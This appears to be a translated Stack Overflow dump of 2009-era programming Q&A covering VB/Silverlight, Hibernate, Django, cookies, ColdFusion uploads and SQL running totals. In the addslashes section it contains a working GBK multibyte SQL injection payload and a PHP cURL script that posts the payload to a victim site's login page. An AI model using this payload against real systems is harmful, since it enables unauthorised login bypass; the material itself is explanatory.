    <Tester:MyControl1 HorizontalAlignment="Left" Margin="296,54,0,0" VerticalAlignment="Top" Width="60" Height="60" x:Name="Test5"/>
</Grid> 
```

**我的自定义控件 VB 代码：**

```
Partial Public Class MyControl1
    Public Sub New()
        MyBase.New()

        Me.InitializeComponent()

        ' Insert code required on object creation below this point.
    End Sub

    Private Sub OnMouseClick(ByVal sender As System.Object, ByVal e As System.Windows.Input.MouseButtonEventArgs)

        Dim int_Temp As Integer
        Dim str_InstanceName As String

        str_InstanceName = "1.What code here tells me the name of the instance which was checked?  Test1, Test2, etc. for example."

        int_Temp = MessageBox.Show(str_InstanceName, "Testing", MessageBoxButton.OK)

        '2.What code here lets me manipulate parts of my control instances (and not just the instance which was clicked)?

                'I want to hide Test1.Line1 and Test2.Line3 and Test3.Circle1 and change the background of Test5.Rectangle1 for example.

    End Sub
End Class 
```

在此先感谢，并对我在 VB 中需要它的所有 C# 专家表示歉意。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-14T02:12:52.717

看起来您在谈论用户控件，而不是自定义控件。与两者一起工作时存在一些差异。您可以在此处阅读有关这些差异的更多信息：

[自定义控件与。用户控制](http://tocode.blogspot.com/2008/04/silverlight-2-custom-controls-vs-user.html)

在这种情况下，您希望查看事件处理程序中的“发送者”对象。您想将发件人转换为您的用户控件（这将是安全的，因为您仅在您的类型的控件上使用该事件处理程序）。

```
Private Sub OnMouseClick(ByVal sender As System.Object, ByVal e As System.Windows.Input.MouseButtonEventArgs)

    Dim senderAsControl As MyControl1 = sender As MyControl1

    ' Get the instance name from the sender
    Dim instanceName As String = senderAsControl.Name

    ' You can also access your children from the sender once cast
    senderAsControl.Rectangel1.IsVisible = False ' Hide the rectangle

End Sub 
```

我现在无法编译代码来仔细检查自己......但它应该给你这个想法。

# java - Hibernate + Spring 使用多个数据源？

> ID：860918
> 
> 赞同：15
> 
> 时间：2009-05-13T23:28:50.407
> 
> 标签：java, hibernate, spring, spring-mvc

我正在开发一个使用 Spring MVC 2.5 和 Hibernate 的 Web 应用程序。

应用程序的要求之一是它必须能够将一些对象导出到外部数据库。我想我不妨使用我现有的数据层并将对象保存到外部源。

我是 Spring 和 Hibernate 的新手，我想我只是想知道我应该如何处理这个问题。现在一切都通过注释自动连接起来。我猜我必须创建一个新的 dataSource bean、一个新的 sessionFactory 和一个 transactionManager……也许……但是……

1.  我只希望在用户专门“导出”时可以使用与外部数据源的连接。

2.  自动装配会妨碍我吗？当我为导出过程实例化 DAO 时，如何告诉 Spring 注入适当的 sessionFactory？（我通过构造函数自动装配）我是否应该以编程方式创建我的会话工厂（等），然后手动实例化我的 DAO？如果是这样，这会“覆盖”自动装配注释吗？

我想我不需要回答上述问题，如果有人可以引导我完成让这样的事情起作用的基本过程。谢谢！

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2009-05-15T05:51:06.550

幸运的是，Spring 已经为此提供了解决方案：AbstractRoutingDataSource。它基本上充当多个 DataSource 的 Facade，并允许您对其进行子类化并实现您需要决定应该使用哪个 DataSource 的任何逻辑。一些细节在这里：

[http://blog.springsource.com/2007/01/23/dynamic-datasource-routing/](http://blog.springsource.com/2007/01/23/dynamic-datasource-routing/)

这允许您的 DataSource 查找逻辑在一个地方进行处理。您的 DAO 层和 SessionFactory 不需要调整，只是您需要将 AbstractRoutingDataSource 的子类注入 Hibernate SessionFactory。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-05-14T10:15:34.600

在 spring 上下文中配置多个数据源和会话工厂本身不会成为问题，但它确实会降低自动装配的吸引力。

您可以使用`@Qualifier`注释来告诉自动装配选择哪一个，但我建议不要使用自动装配，而是使用`<property>`or显式注入正确的数据源和会话工厂`<constructor-arg>`。

如果两个数据源都由您的应用程序服务器管理，则事务管理器可能会在两个数据源之间共享，但听起来两个数据源之间的事务完整性不是您的要求，并且每个数据源都有单独的事务就足够了。

# c++ - 使用 -fno-access-control 进行单元测试

> ID：860923
> 
> 赞同：7
> 
> 时间：2009-05-13T23:29:35.743
> 
> 标签：c++, unit-testing, gcc

我见过许多在单元测试时访问私有变量的疯狂方法。我见过的最令人兴奋的是`#define private public`。

但是，我从未见过有人建议在编译器级别关闭私有变量。我一直以为你做不到。我向许多开发人员抱怨说，如果您可以告诉编译器为这个文件退出，那么单元测试会容易得多。

然后我偶然发现了`-fno-access-control`GCC 编译器选项。这显然是单元测试的完美方式。您的原始源文件未经修改，没有仅用于单元测试的注入朋友，没有使用奇怪的预处理器魔法重新编译。编译单元测试时只需轻按“禁止访问控制”开关。

我错过了什么吗？这是我希望的单元测试银弹吗？

我看到的唯一缺点是该技术的 GCC 特定性质。但是，我认为 MSVS 也有类似的标志。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-05-14T14:19:32.983

我认为单元测试不应该需要访问私有成员。

通常，单元测试旨在测试您的类的*接口*，而不是内部实现。这样一来，只有在接口被破坏时，对内部结构的更改才会破坏测试。

看看我对类似问题的回答，以及随后的讨论[。](https://stackoverflow.com/questions/342037/testing-classes/342065#342065)可以肯定的是，这是一个有争议的话题，但这是我的 0.02 美元。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-14T15:40:06.767

我通常尝试在单元测试中只使用我的类的公共接口。测试驱动开发/设计在这里有很大帮助，因为生成的类倾向于启用这种类型的单元测试。

但是，有时您确实需要让单元测试访问非公共成员，例如，将 Singleton 的内容替换为 Fake 实例。为此，我使用 Java 中的包保护和 C++ 中的朋友。

有些人似乎会向后弯腰以避开朋友，但应该在适当的时候使用它们，并且它们的使用不会影响设计。它们也是声明性的，让其他程序员知道你在做什么。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-02-03T22:15:10.560

哇，这对我来说非常有效。

我担心它不会因为我的单元测试需要访问其他动态库（.so 文件）中构建的类的私有成员，但这正是我所需要的。

我只需要在我的单元测试.so 编译时声明标志（每个测试都是一个.so）。甚至在定义被访问对象的库上也没有。

我需要它来访问表单上的内部小部件以填写它们的值；它们对程序的其余部分不可见，但如果我的测试要代表用户输入输入，则需要它们。只是想我会为那些私人访问反对者分享一个用例:)

同样为了完整性，这是我的表单类，显示私有 name_ 字段：

```
struct EditProduct : public widgets::BusinessObjForm<model::Product> {
public:
    EditProduct (WContainerWidget *parent=0);
protected:
    void fillObjFields();
private:
    // Consts
    static const double minPrice = 0.0;
    static const double maxPrice = 10000.0;
    // Fields
    WLineEdit* name_;
    WTextEdit* description_;
    WSpinBox* price_;
    WFileUpload* image_;
    // Methods
    bool validate();
    void saveProduct(const WString& message);
}; 
```

这是我访问该小部件的单元测试的开始：

```
BOOST_AUTO_TEST_CASE( form_save_test )
{
    EditProduct form(app.root());
    string txt = "this is a product";
    form.name_->setText(txt);
    BOOST_CHECK_EQUAL(form.name_->text(), txt);
} 
```

# java - Java Servlet API 是否向后兼容？

> ID：860938
> 
> 赞同：14
> 
> 时间：2009-05-13T23:33:36.000
> 
> 标签：java, servlets

我想编写一个使用 javax servlet API 的 JAR 文件。如果我针对 2.2 版编写，这是否意味着它将适用于 2.3、2.4 和 2.5 版？

谢谢

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-05-13T23:36:26.213

是的，它们向后兼容。

[甲骨文来源](http://docs.oracle.com/cd/E19798-01/821-1752/beagj/index.html)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-05-14T09:31:32.223

在大多数情况下，不应该有任何兼容性问题。可能有几个陷阱，这取决于你在做什么。如果您正在编写一些装饰容器类的框架，则偶尔会修改接口。例如，[ServletRequest.getRemotePort()方法在](http://java.sun.com/javaee/5/docs/api/javax/servlet/ServletRequest.html#getRemotePort())[J2EE 1.3 版本](http://java.sun.com/j2ee/sdk_1.3/techdocs/api/javax/servlet/ServletRequest.html)（在 Servlet 2.4 之前）中不存在。这些困难是可以克服的，但请注意，您将不得不将它们纳入您的开发和测试中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-14T09:37:02.413

它会起作用，尽管有时某些方法会被弃用，并且可能会引发有关其实施的警告。

# iphone - 如何让 UITextView 尊重 Interface Builder 中的换行符？

> ID：860940
> 
> 赞同：47
> 
> 时间：2009-05-13T23:33:50.977
> 
> 标签：iphone, interface-builder, newline, uitextview

我有一个`UITextView`嵌入到`UIScrollView`. Interface Builder 不允许我为间距添加多个换行符；当我点击返回时，它会将其视为“输入结束”，而不是将换行符附加到`UITextView`.

我怎样才能让它接受换行符的间距？

* * *

## 回答 #1

> 赞同：147
> 
> 时间：2009-08-08T20:36:09.897

比以前的答案更简单（并且更多基于 IB）：

只需`Alt`+`ENTER`它将向`UITextView`.

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-05-13T23:35:43.627

在 TextEdit 中写下您的文本，然后复制/粘贴。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-14T04:45:47.370

正如 sbwoodside 所说，文本编辑器是最简单的方法。

就是说，如果您需要更多控制，或者它不能*正常*工作，请不要使用 IB。理想情况下，如果您需要任何类型的格式来处理大量文本，请以编程方式进行。

IB中的格式化是可怕的。我试图在 UITextView 中添加一些“条款和条件”，这真的很痛苦。

最后，它比弄乱 IB 更容易......

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-06T10:36:59.343

在 IB 中 Shift+Alt (Option)+Enter 作为新段落

# python - 如何在 Django 中执行此连接查询

> ID：860941
> 
> 赞同：13
> 
> 时间：2009-05-13T23:34:24.720
> 
> 标签：python, sql, django

在 Django 中，我有两个模型：

```
class Product(models.Model):
    name = models.CharField(max_length = 50)
    categories = models.ManyToManyField(Category)

class ProductRank(models.Model):
    product = models.ForeignKey(Product)
    rank = models.IntegerField(default = 0) 
```

我将排名放入单独的表中，因为页面的每个视图都会导致排名发生变化，并且我担心所有这些写入会使我的其他（主要是读取）查询变慢。

`Products`我从一个简单的查询中收集了一个列表：

```
cat = Category.objects.get(pk = 1)
products = Product.objects.filter(categories = cat) 
```

我现在想获得这些产品的所有排名。我宁愿一次性完成所有操作（使用 SQL 连接），并且想知道如何使用 Django 的查询机制来表达它。

在 Django 中执行此操作的正确方法是什么？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2009-05-13T23:55:05.780

这可以在 Django 中完成，但您需要稍微不同地重构模型：

```
class Product(models.Model):
    name = models.CharField(max_length=50)
    product_rank = models.OneToOneField('ProductRank')

class ProductRank(models.Model):
    rank = models.IntegerField(default=0) 
```

[现在，在获取 Product 对象时，您可以使用select_related()](https://docs.djangoproject.com/en/dev/ref/models/querysets/#select-related)方法在一个查询中遵循一对一的关系：

```
Product.objects.filter([...]).select_related() 
```

这将产生一个使用连接获取产品排名的查询：

```
SELECT "example_product"."id", "example_product"."name", "example_product"."product_rank_id", "example_productrank"."id", "example_productrank"."rank" FROM "example_product" INNER JOIN "example_productrank" ON ("example_product"."product_rank_id" = "example_productrank"."id") 
```

我不得不将 Product 和 ProductRank 之间的关系字段移动到 Product 模型，因为它看起来 select_related() 仅在一个方向上遵循外键。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-05-14T01:20:40.063

我没有检查但是：

```
products = Product.objects.filter(categories__pk=1).select_related() 
```

应该抓住每一个实例。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-13T23:50:08.330

添加对 QuerySet 的 select_related() 方法的调用，虽然我不肯定会在两个方向上获取引用，但它是最有可能的答案。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-10-03T14:00:03.847

对于 Django 2.1 来自文档

此示例检索名称为“Beatles Blog”的 Blog 的所有 Entry 对象：

```
 Entry.objects.filter(blog__name='Beatles Blog') 
```

文档网址 [https://docs.djangoproject.com/en/2.1/topics/db/queries/](https://docs.djangoproject.com/en/2.1/topics/db/queries/)

# unit-testing - 单元测试构建文件

> ID：860953
> 
> 赞同：6
> 
> 时间：2009-05-13T23:37:59.253
> 
> 标签：unit-testing, makefile, cmake, autotools, scons

单元测试构建文件的最佳策略是什么？

我问的原因是我的公司生产高度可靠的嵌入式设备。软件补丁不是一种选择，因为它们花费了我们的客户数千美元来分发。因此，我们有非常严格的代码质量程序（单元测试、代码审查、可追溯性等）。这些程序正在应用于我们的构建文件（如果你必须知道，我希望是自动工具），但如果感觉就像一个 hack。

> 呃......项目编译......将构建文件标记为已审核和单元测试。

必须有更好的方法。想法？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-05-14T13:42:50.013

这是我们在跨十几个平台构建大型代码库（数百万行代码）时所采用的方法。

*   **Makefile 更改由构建团队审核。** 这些人知道人们在我们的构建环境中容易犯的错误，并且当构建中断时，他们是首当其冲的人，因此他们有动力去发现问题。
*   **尽量减少 Makefile 中的内容**，因此出错的机会更少。我们在 make 之上有一个层，用于生成 Makefile。开发人员只需要在更高级别的文件中使用标签来指示，例如给定的目标是共享库或单元测试。通常在一行上定义一个目标，然后在生成的 Makefile 中产生多个设置/目标。类似的事情也可以用[scons 之](http://www.scons.org/)类的构建工具来完成，它允许人们抽象出平台特定细节之类的东西，从而使目标变得非常简单。
*   **我们的构建工具的单元测试。** 该工具是用 Perl 编写的，因此我们在那里使用 Perl 的[Test::More](http://search.cpan.org/~mschwern/Test-Simple-0.86/lib/Test/More.pm)单元测试框架来验证该工具是否根据我们的更高级别文件生成正确的 Makefile。如果我们改用 scons 之类的东西，我会使用[他们的测试框架](http://code.google.com/p/swtoolkit/wiki/Testing)。
*   **我们每晚构建/测试脚本的单元测试。** 我们有一组脚本，可以在每个平台上开始每晚构建、运行静态分析工具、运行单元测试、运行功能测试，并将所有结果报告给中央数据库。我们单独测试各种脚本，主要使用 sh/bash/ksh/etc 的[shunit2](http://code.google.com/p/shunit2/)单元测试框架。
*   **我们的构建/测试过程的端到端测试。** 我正在做一个端到端的测试，它在一个很小的源代码树上运行，而不是我们的生产代码，因为后者可能需要几个小时才能构建。这些测试主要是为了验证我们的构建目标是否仍然有效，并将结果报告到我们的中央数据库中，例如，升级我们的代码覆盖工具或更改我们的构建脚本。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-14T14:57:51.767

让您的构建文件编译您的软件的已知版本（或从构建角度来看类似的更简单的代码段），并将使用新构建工具获得的结果与预期结果（使用经过验证的构建工具版本构建）进行比较）。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2009-05-14T13:45:28.137

在我的项目中，构建文件不会经常更改。更重要的是，我可以重用早期项目中的构建文件，只需更改一些变量（我将其移至易于识别的部分）。这就是为什么对我来说不需要对构建文件进行单元测试。在其他项目中可能会有所不同。

# php - 通过 addlashes() 进行 SQL 注入的示例？

> ID：860954
> 
> 赞同：69
> 
> 时间：2009-05-13T23:38:10.610
> 
> 标签：php, sql, sql-injection, security

在 PHP 中，我知道这`mysql_real_escape`比使用`addslashes`. 但是，我找不到`addslashes`让 SQL 注入发生的情况的示例。

谁能举一些例子？

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2009-05-13T23:40:31.077

嗯，[这就是你想要的文章](http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string)。

基本上，攻击的工作方式是`addslashes()`将反斜杠放在多字节字符的中间，这样反斜杠就会因为成为有效多字节序列的一部分而失去意义。

文章中的一般警告：

> `0x5c`这种类型的 攻击对于任何以`addslashes()`. UTF-8 不符合此描述。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-19T09:50:53.190

[Chris Shiflett](http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string)用下面的例子清楚地解释了，如果你在数据库中使用 GBK 编码时尝试一下，那当然会起作用。即使我尝试过，这也证明了sql注入的机会，虽然很少，但是有知识和能力的人可以轻松注入。这是一个例子......

```
<?php 

       $mysql = array();
       $db = mysqli_init();
       $db->real_connect('localhost', 'myuser', 'mypass', 'mydb');

       /* SQL Injection Example */

       $_POST['username'] = chr(0xbf) . chr(0x27) . ' OR username = username /*';
       $_POST['password'] = 'guess';

       $mysql['username'] = addslashes($_POST['username']);
       $mysql['password'] = addslashes($_POST['password']);

       $sql = "SELECT * FROM   users
               WHERE username = '{$mysql['username']}'
               AND password = '{$mysql['password']}'";

       $result = $db->query($sql);

       if ($result->num_rows) {
              /* Success */
       } else {
              /* Failure */
       }

?> 
```

虽然使用addslashes() 或magic_quotes_gpc 通常会被认为有些安全，但使用GBK 会使它们几乎无用。下面的 PHP cURL 脚本将能够利用注入，我希望这能帮助你更多地理解：

```
<?php

       $url     = "http://www.victimsite.com/login.php";
       $ref     = "http://www.victimsite.com/index.php";
       $session = "PHPSESSID=abcdef01234567890abcdef01";

       $ch      = curl_init();

       curl_setopt( $ch, CURLOPT_URL,            $url     );
       curl_setopt( $ch, CURLOPT_REFERER,        $ref     );
       curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE     );
       curl_setopt( $ch, CURLOPT_COOKIE,         $session );
       curl_setopt( $ch, CURLOPT_POST,           TRUE     );
       curl_setopt( $ch, CURLOPT_POSTFIELDS,     "username=" . chr(0xbf) . chr(0x27) .
                                                 "OR 1=1/*&submit=1" );

       $data = curl_exec( $ch );

       print( $data );
       curl_close( $ch );
 ?> 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-30T04:09:44.180

作为对这里答案读者的补充：这个 MySQL 错误已经修复:)

此外，使用准备好的语句始终是一种好习惯。这是您可以触发查询的最无漏洞利用的方式（并且在几个用例中是性能最高的）。它会让你摆脱这个缺陷。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-07-02T09:01:11.273

[mysql_real_escape_string() 与 Prepared Statements 对比](http://ilia.ws/archives/103-mysql_real_escape_string-versus-Prepared-Statements.html)清楚地解释了**mysql_real_escape_string() 不是 100% 安全**的。

使用**mysql_set_charset('GBK')**代替**mysql_query("SET CHARACTER SET 'GBK'")**， mysql_real_escape_string() 可以 100% 安全。

# javascript - 使用 javascript 获取或设置 cookie

> ID：860962
> 
> 赞同：0
> 
> 时间：2009-05-13T23:39:49.033
> 
> 标签：javascript, cookies, get, set

我的问题是我是否可以使用 javascript 设置 cookie（并阅读它）

我的第一印象是下面的代码不起作用如果我查看我的 vista cookie 文件夹，我看不到 cookie 的名称

```
function zetCookie(naam,waarde,dagen) {     // setCookie(name,value,days)
    if (dagen) {
        var date = new Date();
        date.setTime(date.getTime()+(days*24*60*60*1000));
        var verloopdatum = "; expires="+date.toGMTString(); // expiry_date
    }
    else var verloopdatum = "";
    document.cookie = naam+"="+waarde+verloopdatum+"; path=/";
}    

function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-05-13T23:44:22.300

我无法回答为什么 cookie 没有显示在您的 Vista 文件夹中，但该代码按预期正确设置和读取 cookie。你如何测试它？测试 cookie 是否粘住的更简单方法是简单地执行以下操作：

```
<input type="button" value="Set" onClick="createCookie('test','yay',5);">
<input type="button" value="Read" onClick="alert(readCookie('test'));"> 
```

如果让您感觉更好，您可以在设置和阅读之间刷新页面，但这[对我有用](http://jsbin.com/abeye)。

如果这没有显示您的预期，请确保您的浏览器设置为接受 cookie。:)

**编辑**：查看您的代码，您错过了`days`在此行中的替换：

```
date.setTime(date.getTime()+(days*24*60*60*1000)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-23T19:03:37.340

I'm testing it here: [http://flamencopeko.net/cookie.php](http://flamencopeko.net/cookie.php) and here: [http://flamencopeko.net/cookie.js](http://flamencopeko.net/cookie.js). Works perfect.

And, yeah, Firebug's Cookies panel is great.

I'm trying to use your script to save font size preference. Here is a thread on that: [simplify font size toggle](https://stackoverflow.com/questions/16694234/simplify-font-size-toggle).

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2009-05-14T01:18:40.567

1.  安装火狐
2.  安装萤火虫
3.  安装 FireCookie
4.  下载 jQuery
5.  下载[Cookie 插件](http://plugins.jquery.com/project/Cookie)

# coldfusion - ColdFusion：在上传之前获取文件的名称

> ID：860964
> 
> 赞同：14
> 
> 时间：2009-05-13T23:40:58.063
> 
> 标签：coldfusion, file-upload

在调用之前如何获取文件的文件名

```
<cffile action = "upload"> 
```

? 我可以获取临时文件的文件名，但不能获取实际文件名。在 PHP 领域，我可以使用 $_FILES 超全局来获得我想要的东西——但据我所知，ColdFusion 中不存在这样的东西。

我可以在客户端获取文件名，但真的很想做这个服务器端。

谢谢

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-12-04T06:46:41.527

是的，这是可能的。在使用 cffile 标记之前，您可以使用此函数来获取客户端文件名：

```
<cffunction name="getClientFileName" returntype="string" output="false" hint="">
    <cfargument name="fieldName" required="true" type="string" hint="Name of the Form field" />

    <cfset var tmpPartsArray = Form.getPartsArray() />

    <cfif IsDefined("tmpPartsArray")>
        <cfloop array="#tmpPartsArray#" index="local.tmpPart">
            <cfif local.tmpPart.isFile() AND local.tmpPart.getName() EQ arguments.fieldName> <!---   --->
                <cfreturn local.tmpPart.getFileName() />
            </cfif>
        </cfloop>
    </cfif>

    <cfreturn "" />
</cffunction> 
```

更多信息在这里： http: [//www.stillnetstudios.com/get-filename-before-calling-cffile/](http://www.stillnetstudios.com/get-filename-before-calling-cffile/)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-05-12T03:12:04.427

我正在使用 Railo 并找到原始文件名：

`GetPageContext().formScope().getUploadResource('your_file_input_form_name').getName();`

也许这也适用于 adobe 服务器？如果您想以某种方式重命名上传的文件并且不希望它通过两个临时目录移动（请参阅[上传文件时重命名文件（CFFILE 的实际工作原理）](http://blogs.adobe.com/cantrell/archives/2004/07/renaming_files.html)） ，它非常方便

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2009-05-14T00:28:00.280

在调用 cffile 之前，我不知道有什么方法可以找到，但可能有一种解决方法。

当您调用时，`<cffile action="upload">`您可以使用 指定结果`result="variable"`。因此，使用目标作为临时文件调用上传。您的结果变量是一个包含成员 clientFile 的结构，它是客户端计算机上文件的名称。

现在，您可以使用`<cffile action="move">`原始文件名来执行您需要执行的任何操作。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2010-01-19T18:49:46.100

哇，我找到了一个伟大而简单的解决方案！用一点 javascript

通过这种方式，您可以获得 cffile 上传的临时文件名和数据库的实际 file.jpg 名称

```
<html>
<head>
<script type="text/javascript">
function PassFileName()
{
document.getElementById("fileName").value=document.getElementById("fileUp").value;
}
</script>
</head>
<body>
<form name="form1" method="post" enctype="multipart/form-data" >
File: <input type="file" name="fileUp" id="fileUp" size="20" onchange="PassFileName()" /> <br />
Title: <input type="text" name="Title" id="Title"><br />
<input type="hidden" id="fileName" size="20" name="fileName" />
<input type="submit" name="submit">
</form>
</body>
</html> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-14T15:53:39.980

If you have the name attribute defined on the input control, the file name will be in the FORM scope. For example:

```
<cfif not structIsEmpty(form)>
    <cfdump var="#form#">
<cfelse>
    <html>
    <head>
        <title>Title</title>
    </head>
    <body>
        <form method="POST" action="#cgi.SCRIPT_NAME#">
            <input type="file" name="fileIn" />
            <input type="Submit" name="formSubmit">
        </form>
    </body>
    </html>
</cfif> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-14T18:50:15.017

另一种选择可能是让客户端代码使用文件名填充隐藏的表单字段，然后您将拥有服务器端。

不过，Ben Doom 的回答通常是我会如何处理它。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-05-27T20:31:43.497

这是我们如何做到的。基本上，有一个文件字段和一个字符串字段。JavaScript 在提交表单之前从浏览器中获取文件名。显然，您需要验证另一端的文件名是否确实存在（例如，如果用户禁用了 JavaScript，它将为空）并且您需要解析字符串以处理平台差异（`/users/bob/file.jpg`vs `C:\Documents and Settings\bob\file.jpg`）

```
<script>
    function WriteClientFileName(){
        $('ClientFileName').value = $('ClientFile').value;
    }
</script>

<form enctype="multipart/form-data" onsubmit="WriteClientFileName();">

    <input type="File" name="ClientFile" id="ClientFile">
    <input type="hidden" name="ClientFileName" id="ClientFileName" value="">

    <input type="submit">
</form> 
```

顺便说一句，这种技术是跨语言的。它同样适用于 RoR、PHP、JSP 等。

**编辑：**如果用户“挥舞着凶猛的 FireBug”，有什么问题？即使他们没有 Firebug，他们仍然可以重命名文件并更改输入。另外，您正在验证您的输入，对吗？

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2009-05-29T23:52:37.120

在 ColdFuson、Railo 或 OpenBD 中保存到服务器之前，无法知道上传文件的文件名。我通常在保存文件之前使用 createUUID() 函数生成“我的”新文件名。

# c# - 如何在数据列表asp.net的列中创建字母顺序

> ID：860965
> 
> 赞同：1
> 
> 时间：2009-05-13T23:41:19.623
> 
> 标签：c#, asp.net, gridview

我试图创建一个数据列表，在列中按字母顺序显示所有美食，但是我找不到这样做的方法，任何人都可以帮忙。

在 asp.net 中使用数据列表或中继器仅允许您以水平或垂直字母顺序显示，例如

```
Afghan       Asian       Burmese     Cambodian
Chinese     Croatian    European    French
Greek            Indian     International   Italian 
```

我想拥有的是

```
Afghan      Chinese      Greek
Asian       Croatian     Indian 
Burmese     European     International 
Cambodian   French       Italian 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T22:29:39.967

nickf 的回答帮助我找到了以下方法，该方法将根据需要转换列表：

```
public static List<T> ReorderListIntoColumns<T>(List<T> list, int totalColumns)
    {
        List<T> reordered = new List<T>();
        int itemsPerColumn = (int) list.Count / totalColumns;

        for (int i = 0; i < itemsPerColumn; i++)
        {
            for (int j = 0; j < totalColumns; j++)
            {
                reordered.Add(list[(j * itemsPerColumn) + i]);
            }
        }

        return reordered;
    } 
```

即使没有公认的答案，这个话题似乎也得到了很多意见。希望这将帮助其他需要以这种方式重新排序列表的人！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-14T02:28:07.843

我要做的是按字母顺序获取您的列表，然后重新排列，以便当您使用 datalist/repeater 默认排序时，它是您想要的格式。

在奇异的伪代码中。

```
/*
your input is A,B,C,D,E,F,G,H,I,J,K,L

given this order, it returns:

A, B, C
D, E, F
G, H, I
J, K, L

but you want

A, E, I
B, F, J
C, G, K
D, H, L

So you need to change your input to this:

A,E,I,B,F,J,C,G,K,D,H,L

*/

let numColumns = 3;
let numItems = 12;
let itemsPerColumn = numItems / numColumns;

loop i from 0 to itemsPerColumn - 1
    loop j from 0 to numColumns - 1
        newOrdering.push(oldOrdering[i * numColumns + j]) 
```

可能有一些漂亮的 .NET 特性可以改变排序方式，但这只是一种老派的方法。

PS：这是在最好的情况下工作，即项目数可以被列数整除。您必须针对不同的值进行一些调整。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-06-18T19:23:50.830

我最近使用一个`PlaceHolder`和一个自定义表完成了这个：

```
<asp:PlaceHolder ID="locationTablePlaceHolder" runat="server"/> 
```

然后在支持代码中：

```
DataView view  = locations.Tables[0].DefaultView;
view.Sort      = "locationName";

Table table = new Table();
locationTablePlaceHolder.Controls.Clear();
locationTablePlaceHolder.Controls.Add(table);

// enumerator to loop through all items in the DataView
IEnumerator enumerator = view.GetEnumerator();
enumerator.Reset();

// first create all the row objects since we want to populate
// column by column.
int rowCount = 5;
int colCount = 5;
for (int i = 0; i < rowCount; i++)
{
    TableRow row = new TableRow();
    table.Rows.Add(row);
}

// then loop through each column taking items from the enumerator
// to populate the table
for (int j = 0; j < colCount; j++)
{
    for (int i = 0; i < rowCount; i++)
    {
        TableCell cell = new TableCell();
        if (enumerator.MoveNext())
        {
            Label label = new Label();
            label.Text = (String)((DataRowView)enumerator.Current).Row["locationName"];
            cell.Controls.Add(label);
            table.Rows[i].Cells.Add(cell);
        }
    }
} 
```

# sql - 在 SQL Server 中计算运行总计

> ID：860966
> 
> 赞同：177
> 
> 时间：2009-05-13T23:42:26.890
> 
> 标签：sql, sql-server, tsql, cumulative-sum

想象一下下表（称为`TestTable`）：

```
id     somedate    somevalue
--     --------    ---------
45     01/Jan/09   3
23     08/Jan/09   5
12     02/Feb/09   0
77     14/Feb/09   7
39     20/Feb/09   34
33     02/Mar/09   6 
```

我想要一个按日期顺序返回运行总计的查询，例如：

```
id     somedate    somevalue  runningtotal
--     --------    ---------  ------------
45     01/Jan/09   3          3
23     08/Jan/09   5          8
12     02/Feb/09   0          8
77     14/Feb/09   7          15  
39     20/Feb/09   34         49
33     02/Mar/09   6          55 
```

我知道在 SQL Server 2000 / 2005 / 2008 中有[多种方法可以做到这一点。](http://geekswithblogs.net/Rhames/archive/2008/10/28/calculating-running-totals-in-sql-server-2005---the-optimal.aspx)

我对这种使用聚合集语句技巧的方法特别感兴趣：

```
INSERT INTO @AnotherTbl(id, somedate, somevalue, runningtotal) 
   SELECT id, somedate, somevalue, null
   FROM TestTable
   ORDER BY somedate

DECLARE @RunningTotal int
SET @RunningTotal = 0

UPDATE @AnotherTbl
SET @RunningTotal = runningtotal = @RunningTotal + somevalue
FROM @AnotherTbl 
```

...这非常有效，但我听说这方面存在问题，因为您不一定能保证该`UPDATE`语句将以正确的顺序处理行。也许我们可以得到一些关于这个问题的明确答案。

但也许人们可以提出其他方法？

编辑：现在使用带有设置的[SqlFiddle](http://sqlfiddle.com/#!3/c8880/4)和上面的“更新技巧”示例

* * *

## 回答 #1

> 赞同：152
> 
> 时间：2009-05-14T00:32:29.260

**更新**，如果您正在运行 SQL Server 2012，请参阅：[https ://stackoverflow.com/a/10309947](https://stackoverflow.com/a/10309947)

